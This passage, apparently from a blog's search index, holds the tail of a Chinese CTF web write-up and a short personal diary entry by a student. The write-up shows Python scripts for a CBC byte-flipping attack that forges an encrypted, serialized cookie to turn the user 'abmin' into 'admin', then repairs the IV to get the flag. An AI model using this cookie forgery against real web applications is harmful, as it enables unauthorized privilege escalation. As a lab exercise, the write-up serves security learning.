me”;s:5:”abmin”;③ s:8:”password”;s④ :5:”abmin”;}分析：我们的目是把abmin 改为admin 由分组可知b在第二组的第11位，所以我们要修改第一组的u 脚本实现：1234567import base64nweCipher=&apos;&apos;cipher = &apos;bp抓到的cipher经过url解密后的值&apos; cipher = base64.b64decode(cipher) #先进行解密newCipher = cipher[0:11] + chr(ord(cipher[11])^ord(&apos;b&apos;)^ord(&apos;d&apos;)) + cipher[12:] #XOR运算修改print base64.b64encode(newCipher) #再进行加密 在bp中添加cookie IV和修改后的cipher(脚本后得到的经过url加密） 注意添加前把post清空 然后go 返回结果： 回应无法反序列化，把无法反序列化字符串解密，发现已经变成了admin，但是我们翻转的时候破坏了第一组，所以无法反序列化，那我们需要把IV修复。 123456789101112import base64import urllibcipher = &apos;&apos;#无法反序列化的字符串iv = &apos;&apos;#先前得到的IVcipher = base64.b64decode(urllib.unquote(cipher))#给cipher解密iv = base64.b64decode(iv) #给先前的IV解密newIv = &apos;&apos;right = &apos;&apos;#破坏前正确的字符串for i in range(16): newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i]))#一位位修复 print urllib.quote(base64.b64encode(newIv)) 返回： 再cookie添加 生成的IV 和 修改的cipher 即可得到flag。]]></content>
+      <categories>
+        <category>CTF-web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>web</tag>
+        <tag>CBC字节翻转攻击</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[在路上]]></title>
+    <url>%2F2018%2F07%2F02%2F%E5%9C%A8%E8%B7%AF%E4%B8%8A%2F</url>
+    <content type="text"><![CDATA[刚刚搭建起自己的博客，很多地方以后慢慢完善。 大一接近尾声了，这一年收获很多，认识了很多人，去了很多地方，当然也有很多不快，警校就是这样吧。自己很多方面还需要去完善，去改正，处理时间方面还是不够好，好好努力，做自己想做的事情。这段时间也挺多事，来的也比较突然的，心情起起落落的，也许我们需要去经历这么多，在突如其来的各种事情面前不知所措，希望都能安稳过去，真的很累！ 学习web有一段时间了，还不能说是完全入门，多少也有些了解了，感觉很多东西很有意思，所以慢慢学。按照自己的计划学习自己喜欢的东西。 希望最坏的快点过去，安安稳稳学技术。祈祷^^ 坚持写博客、坚持学习！]]></content>
+      <categories>
+        <category>生活小记</category>
+      </categories>
+  </entry>
+</search>
